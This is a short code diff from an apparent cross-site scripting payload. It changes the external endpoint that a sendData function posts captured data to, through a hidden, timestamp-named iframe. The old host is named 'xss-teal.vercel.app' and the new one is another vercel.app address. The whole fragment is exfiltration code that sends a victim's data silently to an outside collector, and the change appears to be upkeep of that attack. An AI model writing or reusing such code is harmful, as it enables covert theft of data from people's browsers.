@@ -33,7 +33,7 @@ function sendData(payload) {
   
   var form = document.createElement('form');
   form.method = 'POST';
-  form.action = 'https://xss-teal.vercel.app/';
+  form.action = 'https://b0a.vercel.app/';
   form.target = iframe.name = 'hiddenFrame' + Date.now();
   
   var input = document.createElement('input');
